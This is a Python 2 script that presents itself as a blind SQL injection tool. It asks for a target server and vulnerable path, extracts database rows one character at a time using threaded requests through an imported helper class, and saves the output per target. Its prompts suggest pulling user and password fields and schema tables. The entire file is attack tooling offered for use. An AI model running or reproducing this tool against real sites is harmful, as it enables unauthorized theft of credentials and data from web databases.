#!/usr/bin/env python
import os
from classes import *
import threading
import datetime

def get_info(server_name, https, injection_path, row, field_name, table_name, evl, text, comments, f_name):
	core = Impromptu()

#	Getting each row length
	rLen = core.getLength_bj(server_name, https, injection_path, row, field_name, table_name, evl, text, comments)
	print "Row "+str(row)+' has '+str(rLen)+' chars.'
	rowContent = ""
#	Getting each char
	for char in range(1, rLen+1):
		aChar = core.getChar_bj(server_name, https, injection_path, row, char, field_name, table_name, evl, text, comments); #	Getting a selected char
		#print aChar, #	Printing char
		rowContent += aChar; #	Concat to the others...
		pass
	print "Row "+str(row)+" done."
	f = open(f_name, 'a')
	f.write(rowContent+'\n');
	f.close()
	#allRows.append(rowContent) #	Saving field
	pass
pass

def main():
	#	---
	print"""
# MySQL
#       .----.                                                 
#         /   `                                        /       
#        .  .-. .-.    .--.).--.-._.  .-. .-.    .----/--)  (  
#       / )/   )   )   /  /   (   ) )/   )   )   /  )/  (    ) 
#      / '/   /   (   /`-/     `-' '/   /   (   /`-'/    `--': 
# .---------'      `-/                       `-/          V0.6
#                                 Sys_A501 @ Raza-mexicana.org
#
# Just another "blind SQL injection" script...
# Based on http://websec.ca/kb/sql_injection
"""

	############################
	# Getting injection params #
	############################
	server_name = raw_input("Server name [ex. www.google.com]: ")
	injection_path	= raw_input("Exploitable path [ex. /dev/app/fotos/3]: ")

	https = raw_input("HTTPS(1) or HTTP(0) [default 0]: ")
	https = bool(https)

	evl = raw_input("Evaluate success(1) or error(0) [default 0]: ")
	evl = bool(evl)
	text = raw_input("Evaluation text [ex. You have an error in your SQL syntax]: ")

	field_name = raw_input("Field or concat fields to retrieve [ex. table_name, concat(user,'|',pass)]: ")
	field_name = field_name.replace(' ', '+')

	table_name = raw_input("Table name or query as table [ex. tbl_users, (SELECT table_name from information_schema.tables) as t]: ")
	table_name = table_name.replace(' ', '+')

	comments = raw_input("End query with [ex. --, ;--, //]: ")
	comments = comments.replace(' ', '+')

	#	Definning core
	core = Impromptu()

	#	Counting rows
	print "\n\n\t--> tic, toc, toc, toc... Lets play!\n"
	rowsLimit = core.getRowsNum_bj(server_name, https, injection_path, field_name, table_name, evl, text, comments)
	print "\n"+str(rowsLimit)+" rows..."
	rowContent = ""
	allRows = []

	print "\n-\tRetrieving rows:\n"

	if rowsLimit > 0:
		results = "./results"
		if not os.path.exists(results):
			os.makedirs(results)
		pass

		results += "/"+server_name
		if not os.path.exists(results):
			os.makedirs(results)
		pass

		date_string = datetime.datetime.now().strftime("%Y%m%d-%H_%M_%S")
		f_name = results+"/"+date_string+".txt"

		f = open(f_name, 'a')
		f.write("---\tURL: "+server_name+injection_path+"\n");
		f.write("---\tSELECT "+field_name+" FROM "+table_name+comments+"\n");
		f.write("----------------------------------------------------------\n\n\n");
		f.close()

		for row in range(0, rowsLimit):
			p = threading.Thread(target=get_info, args=(server_name, https, injection_path, row, field_name, table_name, evl, text, comments, f_name,))
			p.daemon = True
			#get_info(server_name, https, injection_path, row, field_name, table_name, evl, text, comments, f_name)
			allRows.append(p)
		pass

		for thread in allRows:
			thread.start()
		pass

		for thread in allRows:
			thread.join()
		pass

	#	Printing values
	print """\n\n
--------------------------------
Retrieved values:
--------------------------------
	"""
	print f_name+":\n\n"
	f = open(f_name, 'r+')
	print f.read()
pass

main()
